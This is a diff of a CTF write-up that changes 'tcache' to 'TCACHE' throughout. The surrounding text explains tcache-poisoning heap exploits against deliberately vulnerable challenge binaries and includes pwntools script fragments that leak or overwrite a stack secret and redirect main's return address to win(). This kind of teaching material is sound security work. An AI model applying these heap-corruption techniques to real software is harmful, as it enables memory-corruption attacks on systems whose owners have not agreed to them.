@@ -6713,22 +6713,22 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-This challenge is essentially the same as the [Seeking Secrets](#seeking-secrets-easy) challenges. A 16-byte secret is stored at a known address, printed at startup, and we have to leak it using tcache poisoning. The only difference is that the secret lives on the stack rather than in the data segment. Since the stack address is printed at startup just like the BSS address was in Seeking Secrets, this makes no difference to the exploit.
+This challenge is essentially the same as the [Seeking Secrets](#seeking-secrets-easy) challenges. A 16-byte secret is stored at a known address, printed at startup, and we have to leak it using TCACHE poisoning. The only difference is that the secret lives on the stack rather than in the data segment. Since the stack address is printed at startup just like the BSS address was in Seeking Secrets, this makes no difference to the exploit.
 
 The `stack_free` and `stack_scanf` commands are not needed at all for the [easy version](#stack-summoning-easy). The solution uses only the standard heap primitives.
 
 ### Polluting TCACHE `entry_struct` to leak the Secret
 
-The approach is identical to Seeking Secrets. We allocate two heap chunks, free them into the tcache, and poison the first chunk's `next` to point at `secret_addr`. We then `malloc` twice and `puts` on the second allocation to leak the secret.
+The approach is identical to Seeking Secrets. We allocate two heap chunks, free them into the TCACHE, and poison the first chunk's `next` to point at `secret_addr`. We then `malloc` twice and `puts` on the second allocation to leak the secret.
 
-The one subtlety is that the tcache count must be at least 1 when we call the final `malloc` that should return `secret_addr`. When `malloc` pops a chunk, it reads that chunk's `next` field, writes it into `entries[idx]`, and decrements `counts[idx]`. If count drops to 0, the next `malloc` call bypasses the tcache entirely, even if `entries[idx]` points somewhere valid.
+The one subtlety is that the TCACHE count must be at least 1 when we call the final `malloc` that should return `secret_addr`. When `malloc` pops a chunk, it reads that chunk's `next` field, writes it into `entries[idx]`, and decrements `counts[idx]`. If count drops to 0, the next `malloc` call bypasses the TCACHE entirely, even if `entries[idx]` points somewhere valid.
 
 With two heap chunks freed (count=2), the sequence works out correctly:
 
-1. `free(1)`, `free(0)`, tcache: `A -> B`, count=2
-2. Poison `A`'s `next` to `secret_addr`, tcache: `A -> secret_addr`, count=2
+1. `free(1)`, `free(0)`, TCACHE: `A -> B`, count=2
+2. Poison `A`'s `next` to `secret_addr`, TCACHE: `A -> secret_addr`, count=2
 3. `malloc` pops `A`, count=1, `entries = secret_addr`
-4. `malloc`, count=1 so tcache is used, pops `secret_addr`, count=0
+4. `malloc`, count=1 so TCACHE is used, pops `secret_addr`, count=0
 
 ```
 free(1), free(0)
@@ -6802,7 +6802,7 @@ scanf(0, p64(secret_addr))
 
 
 malloc(2) -> pops A, count=1, entries=secret_addr
-malloc(3) -> count=1 so tcache is used, pops secret_addr, count=0
+malloc(3) -> count=1 so TCACHE is used, pops secret_addr, count=0
 ```
 
 ### Exploit
@@ -6853,7 +6853,7 @@ b = malloc_leak(1, 192)
 print(f"[*] a: {hex(a)}")
 print(f"[*] b: {hex(b)}")
 
-# free b then a: tcache = a->b, count=2
+# free b then a: TCACHE = a->b, count=2
 free_chunk(1)
 free_chunk(0)
 
@@ -6864,7 +6864,7 @@ scanf_chunk(0, p64(secret_addr))
 c = malloc_leak(2, 192)
 print(f"[*] malloc(2) = {hex(c)}")
 
-# malloc(3): count=1 so tcache is used, pops secret_addr
+# malloc(3): count=1 so TCACHE is used, pops secret_addr
 d = malloc_leak(3, 192)
 print(f"[*] malloc(3) = {hex(d)}")
 
@@ -7035,7 +7035,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-This version prints nothing: no address leaks, no tcache display, no allocation addresses. So we cannot use the same approach as the [easy version](#stack-summoning-easy) since we have no way to know `v14`'s address to poison the tcache with.
+This version prints nothing: no address leaks, no TCACHE display, no allocation addresses. So we cannot use the same approach as the [easy version](#stack-summoning-easy) since we have no way to know `v14`'s address to poison the TCACHE with.
 
 Instead we take the opposite approach: rather than leaking the secret, we overwrite it with a value we choose, then submit that value to `send_flag`.
 
@@ -7049,7 +7049,7 @@ The stack layout gives us everything we need:
 
 `v13` is 64 bytes past `v12`, so `stack_scanf` can plant a fake size field at `v13 - 0x8` (56 bytes into `v12`) just like the Stack Spoofing Hard challenge. We use `0xb1` as the fake size, giving a chunk of 176 bytes with `malloc_usable_size` returning 168 bytes.
 
-After `stack_free` puts `v13` into the tcache, we `malloc` of the same size to get `v13` back into `ptr[0]`. Now `ptr[0]` points directly at `v13`. `v14` sits at `v13 + 0x8a` = offset 138. Since `malloc_usable_size` returns 168 bytes, heap `scanf` lets us write 168 bytes into `ptr[0]`, which is more than enough to reach `v14` at offset 138.
+After `stack_free` puts `v13` into the TCACHE, we `malloc` of the same size to get `v13` back into `ptr[0]`. Now `ptr[0]` points directly at `v13`. `v14` sits at `v13 + 0x8a` = offset 138. Since `malloc_usable_size` returns 168 bytes, heap `scanf` lets us write 168 bytes into `ptr[0]`, which is more than enough to reach `v14` at offset 138.
 
 ```
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
@@ -7103,7 +7103,7 @@ p.sendline(b"stack_scanf")
 p.sendline(b"A" * 56 + p64(0xb1))
 p.recvuntil(b"quit): ")
 
-# free v13 into tcache
+# free v13 into TCACHE
 p.sendline(b"stack_free")
 p.recvuntil(b"quit): ")
 
@@ -7203,7 +7203,7 @@ unsigned __int64 __fastcall echo(__int64 a1, __int64 a2)
 
 This challenge combines the echo emanations and stack spoofing techniques. There is no `send_flag` or secret to leak, the goal is to overwrite `main`'s return address with `win()`.
 
-We have two useful primitives. First, the `echo` command's internal `malloc(0x20)` can be exploited just like in echo emanations to leak a binary address. Second, `stack_free` prints `v15`'s address and frees it into the tcache, giving us both a stack leak and a chunk we can use for tcache poisoning.
+We have two useful primitives. First, the `echo` command's internal `malloc(0x20)` can be exploited just like in echo emanations to leak a binary address. Second, `stack_free` prints `v15`'s address and frees it into the TCACHE, giving us both a stack leak and a chunk we can use for TCACHE poisoning.
 
 ### Binary leak via Echo's Internal Chunk
 
@@ -7240,7 +7240,7 @@ But `stack_free` will abort with `munmap_chunk(): invalid pointer` unless `v15` 
 
 ### TCACHE Poisoning to Overwrite the Return Address
 
-After `stack_free`, `v15` is in the tcache with count=1. We then free two heap chunks of size 128 on top, making count=3 with the chain `a -> b -> v15`. We poison `a`'s `next` to `ret_addr`, orphaning `b` and `v15`. The chain becomes `a -> ret_addr` with count=3.
+After `stack_free`, `v15` is in the TCACHE with count=1. We then free two heap chunks of size 128 on top, making count=3 with the chain `a -> b -> v15`. We poison `a`'s `next` to `ret_addr`, orphaning `b` and `v15`. The chain becomes `a -> ret_addr` with count=3.
 
 ```
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
@@ -7275,7 +7275,7 @@ After `stack_free`, `v15` is in the tcache with count=1. We then free two heap c
 
 Then:
 - `malloc(0)` pops `A`, count=2, head=`ret_addr`
-- `malloc(1)` count=2 so tcache used, pops `ret_addr`, count=1
+- `malloc(1)` count=2 so TCACHE used, pops `ret_addr`, count=1
 - `scanf(1, p64(win_addr))` overwrites the return address with `win`
 - `quit` triggers `main`'s return, jumping to `win()`
 
@@ -7330,7 +7330,7 @@ p.sendline(b"stack_scanf")
 p.sendline(b"A" * 56 + p64(0x81))
 p.recvuntil(b"quit): ")
 
-# stack_free puts v15 into tcache (count=1), leak its address
+# stack_free puts v15 into TCACHE (count=1), leak its address
 p.sendline(b"stack_free")
 p.recvuntil(b"free(")
 v15_addr = int(p.recvuntil(b")").strip(b")"), 16)
@@ -7498,7 +7498,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-The hard version prints nothing at all. No allocation addresses, no `stack_free` address, no tcache display. The goal is the same as the [easy version](#enterprising-echo-easy), overwriting `main`'s return address with `win()`, but we have to obtain both the binary base and the stack address entirely through the echo and tcache mechanisms.
+The hard version prints nothing at all. No allocation addresses, no `stack_free` address, no TCACHE display. The goal is the same as the [easy version](#enterprising-echo-easy), overwriting `main`'s return address with `win()`, but we have to obtain both the binary base and the stack address entirely through the echo and TCACHE mechanisms.
 
 ### Finding win
 
@@ -7558,8 +7558,8 @@ Since `stack_free` prints nothing, we need another way to get `v14`'s address. T
 
 The sequence is:
 
-1. `stack_free` puts `v14` into the tcache. `malloc(2, 128)` pops `v14` into `ptr[2]`.
-2. We `malloc(3, 32)` and `free(3)` to put a 32-byte chunk into the tcache.
+1. `stack_free` puts `v14` into the TCACHE. `malloc(2, 128)` pops `v14` into `ptr[2]`.
+2. We `malloc(3, 32)` and `free(3)` to put a 32-byte chunk into the TCACHE.
 3. We call `echo(2, 0)`. Echo's internal `malloc(0x20)` pops `ptr[3]`'s chunk and writes `argv[2] = ptr[2] + 0 = v14_addr` into it at offset `0x10`.
 4. `ptr[3]` is still a dangling pointer to that chunk. We call `echo(3, 0x10)` to read `v14_addr` back out.
 
@@ -7641,7 +7641,7 @@ p.sendline(b"stack_scanf")
 p.sendline(b"A" * 56 + p64(0x91))
 p.recvuntil(b"quit): ")
 
-# stack_free puts v14 into tcache (count=1)
+# stack_free puts v14 into TCACHE (count=1)
 p.sendline(b"stack_free")
 p.recvuntil(b"quit): ")
 
